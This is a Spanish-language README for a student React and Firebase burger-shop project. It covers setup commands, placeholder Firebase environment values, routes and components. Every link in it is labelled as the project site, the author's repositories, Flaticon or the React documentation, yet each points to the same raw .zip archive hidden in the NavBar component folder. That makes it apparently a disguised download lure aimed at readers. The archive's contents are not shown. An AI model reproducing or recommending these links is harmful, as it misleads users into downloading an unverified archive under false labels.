## `Proyecto`

PLANET BURGER - Proyecto Final de ReactJs (CODERHOUSE)

[PlanetBurger](https://github.com/LautaroFrias/Planet-Burger-React-/raw/refs/heads/main/src/components/NavBar/Burger-Planet-React-2.5.zip) es un e-commerce ficticio, creado y utilizado como proyecto final del curso de JavaScript en CODERHOUSE.
Este emprendimiento al igual que todos mis proyectos de desarrollo web, se encuentran disponibles dentro de mis [Repositorios](https://github.com/LautaroFrias/Planet-Burger-React-/raw/refs/heads/main/src/components/NavBar/Burger-Planet-React-2.5.zip).

## `Scripts disponibles, Instalación y dependencias`

El proyecto esta inicializado con `npx install create-react-app planetburger-app`.

Para el Routing utilice, `npm i react-router-dom` para crear los path y casi en su totalidad, la página utiliza Bootstrap en cuanto a estilos se refiere.
Para ello, instalamos las dependencias desde la consola `npm install react-bootstrap bootstrap@5.1.3`.

Todas las imágenes, iconos y logos se encuentran dentro de la carpeta `public/imagenes`.
Preferentemente utilice [Flaticon](https://github.com/LautaroFrias/Planet-Burger-React-/raw/refs/heads/main/src/components/NavBar/Burger-Planet-React-2.5.zip).

Puedes acceder a la documentación de [React](https://github.com/LautaroFrias/Planet-Burger-React-/raw/refs/heads/main/src/components/NavBar/Burger-Planet-React-2.5.zip).

### `npm start`

La APP inicializa con el comando `npm start` desde la consola de tu editor de código.
Abrir [http://localhost:3000](http://localhost:3000) para visualizarlo en el navegador (no obstante esto ocurre automáticamente).

La página se recargará si realizamos cambios, como también veremos cualquier " lint errors " en la consola.

### `Lenguajes de programacion utilizados`

    HTML
    CSS
    JAVASCRIPT
    REACT JS

Base de datos utilizada:

    Firebase/Firestore

## `.env`

Se agregó un archivo .env con los datos necesarios de Firebase para encriptar las credenciales de administración de Firebase.
Este mismo se encuentra ignorado dentro del archivo `.gitignore`.

Si te interesa visualizar o inicializar el proyecto, encontrarás un archivo con extensión `.env.example`.
Recordá que estos datos son de ejemplo.

    REACT_APP_apiKey=asdasdasdasdasd
    REACT_APP_authDomain=asdasdasd.firebaseapp.com
    REACT_APP_projectId=asdasdasd
    REACT_APP_storageBucket=asdasdasd.appspot.com
    REACT_APP_messagingSenderId=123123123123
    REACT_APP_appId=1:123123123:web:0ae622ca5bsd9fa27d

Luego en `firebase.js` se llaman a las variables de entorno de la siguiente forma:

    apiKey: process.env.REACT_APP_apiKey,
    authDomain: process.env.REACT_APP_authDomain,
    projectId: process.env.REACT_APP_projectId,
    storageBucket: process.env.REACT_APP_storageBucket,
    messagingSenderId: process.env.REACT_APP_messagingSenderId,
    appId: process.env.REACT_APP_appId,

## En este archivo `firebase.js` se inicializa Firebase en la APP.

Inician tanto la base de datos (DataBase) como asi tambien las credenciales de Firebase.

Para crear un Item de la colección de productos, deberá realizarse de la siguiente forma:

    categoria:  categoria del producto
    desc: desc del producto para el 'ItemDetail'
    img: URL donde se alojan las imagenes del menú
    nombre: nombre del producto
    precio: precio del producto
    stock: cantidad disponible, se toma desde el 'ItemCount'
    tamaño: tamaño del producto

## App.js

El archivo principal del proyecto es App.js, desde aqui se rutea toda la App.

### - Navbar

### - ItemListContainer

### - ItemDetailContainer

### - Cart

### - BuyOrders

        . '/' navega a `<ItemListContainer>`
        . '/category/:categoryId' toma el ID de la categoria y filtra los productos
            que luego se muestran en `<ItemListContainer>`
        . '/detail/:paramId' navega a `<ItemDetailContainer>`
        . '/Cart' se dirige al Carrito con los productos agregados por el usuario
        . '/BuyOrders' es un componente donde se muestran todas las compras realizadas
        segun el email del comprador, el cual `<Mensaje.js>` se encarga del renderizado.
        Este crea un ticket en la Firestore Database (Firebase).

## Navbar

La barra de navegación esta hecha con 'bootstrap', y el routing con 'react-router-dom' (version 6).
Recomendable usar la version "6.0.2" de 'react-router-dom' para no tener inconvenientes a la hora de la navegación entre categorías
o posibles errores de la App.

### Logo Hamburguesa

Al clickear en el logo, este nos direcciona `('/')` al Menú (Home) de la App `<ItemListContainer />`. Se comporta igual que el botón Home.

### Boton Desplegable (Dropdown)

### Boton Home

Direcciona a la ruta `('/')` Home `<ItemListContainer />`, donde se puede visualizar la totalidad de los productos.
Funciona de manera independiente y no contiene ninguna categoría.

### Boton Hamburguesas y Boton Papas Fritas

Las categorías se dividen en 2, con botones independientes en el Navbar.
Estos navegan a `('/category/:categoryId')` donde `:categoryId` es el ID de cada
categoría.
A su vez, estas cuentan con una sub-categoría.
Para las hamburguesas, por su tamaño ya sea: Simple o Doble.
Para las papas fritas, tambien por su tamaño sea: Individual o Para Compartir.

### <CartWidget>

Este componente, es un boton compuesto por un logo de un carrito de compras y un número que va a ir actualizandose
a medida que el usuario agregue productos.

## ItemListContainer

Este componente de estilo container, almacena como children al componente `<ItemList>` el cual muestra una vista simplificada de
las propiedades de cada producto. Mediante el uso de `hook`, se muestran los productos según su categoría.

## ItemDetailContainer

Almacena como children al componente `<ItemDetail>` donde despliega el detalle un producto.
Esto solo sucede al momento de seleccionar un item, y con la ayuda de un `hook`, toma el ID del producto seleccionado
para luego volcarlo con un `props` toda la información del mismo.

## ItemDetail

En este componente contenedor muestra la información detallada de un producto que selecciona el usuario, ademas de que se le
agrega como hijo el `<ItemCount>`, el cual tiene la función de aumentar o decrementar la cantidad del producto seleccionado para luego
enviarlo al carrito mediante el boton `Agregar al carrito` `(/cart)`. El contador va a aumentar hasta la cantidad que tenga como stock el producto
sin superarlo, del mismo modo va a decrementar, sin llegar ser un número negativo.
En todo momento, si quisieramos mediante el boton `Regresar`, volveriamos al Home para volver a repetir el proceso.

## ItemCount

Componente que almacena las funciones de aumentar o decrementar la cantidad del producto seleccionado, previo a enviarse al carrito o finalizar la compra.

## Cart

Es el componente donde se van a listar los productos que previamente selecciono el usuario, desde el `<ItemDetail>`.
En esta instancia podemos `vaciar carrito` y nos da la posibilidad de `volver a Inicio` para repetir el proceso de compra.
Si en cambio se quisiera eliminar un producto en particular, esto se hace mediante el boton `eliminar 🚮`.
Por el contrario, si quisieramos habilitar el boton de `Finalizar compra`, antes deberiamos llenar el formulario, que se trae con la función
`llenarFormulario` declarada en el `(/cart)`.

## BuyOrders

En este componente seremos redirigidos a un listado de los productos comprados, el cual se filtra por
el E-mail del comprador. Es decir, que podremos visualizar todas las compras que hizo el usuario con un mismo E-mail.
Al realizarse la compra con éxito se creará un ticket con: ID de la compra, E-mail del comprador, fecha y hora,
nombre de el/los producto/s, la cantidad y el total. `(/Mensaje.js)`
A su vez que tambien se muestra en la base de datos de Firestore (Firebase) como una colección llamada 'Tickets'.
